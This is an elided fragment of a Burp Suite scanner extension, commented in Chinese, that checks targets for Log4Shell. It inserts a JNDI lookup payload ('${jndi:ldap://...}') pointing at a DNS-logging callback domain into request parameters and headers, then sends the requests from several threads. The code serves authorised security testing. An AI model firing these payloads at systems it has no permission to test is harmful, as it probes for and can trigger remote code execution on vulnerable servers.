...
class BurpExtender(IBurpExtender, IMessageEditorTabFactory, IContextMenuFactory, IScannerCheck):
    ...
    # 替换Headers
    def reg_Headers(self,Headers,cs1,payload1):
    ...
    def filter_url(self, reqUrl):
        noCheckedSuffix = ['css', 'js', 'jpg', 'gif', 'html', 'png', 'ico', 'svg', 'jpeg','asp','aspx','php','ashx','amsx']
    ...
    def start_run(self, baseRequestResponse):
        ...
        for parameter in reqParameters:
            ...
            parameterRCEsQueue.put([request, protocol, httpService, parameterName, parameterValue, payload,
                                        parameterType, reqUrl,cs,reqHeaders,i,reqBodys])  # 构造新的参数值，带有sql测试语句

        #检测Headers替换
        cs1=self.ranstr(6)
        payload1=r"${jndi:ldap://"+cs1+"."+ceye_dom+"/6}"
        a='1' #判断是否为Headers 检测
        reqHeaders1=self.reg_Headers(reqHeaders,cs1,payload1)
        #self.reg_Headers(reqHeaders)
        #print request_bodys
        #
        #数据不为空
        parameterName='a'
        ...
        parameterRCEsQueue.put([request, protocol, httpService, parameterName, parameterValue, payload1,
                                       parameterType, reqUrl,cs1,reqHeaders1,a,reqBodys])  # 构造新的参数值，带有sql测试语句
        # 多线程跑每个payload
        threads = []
        for i in range(3):
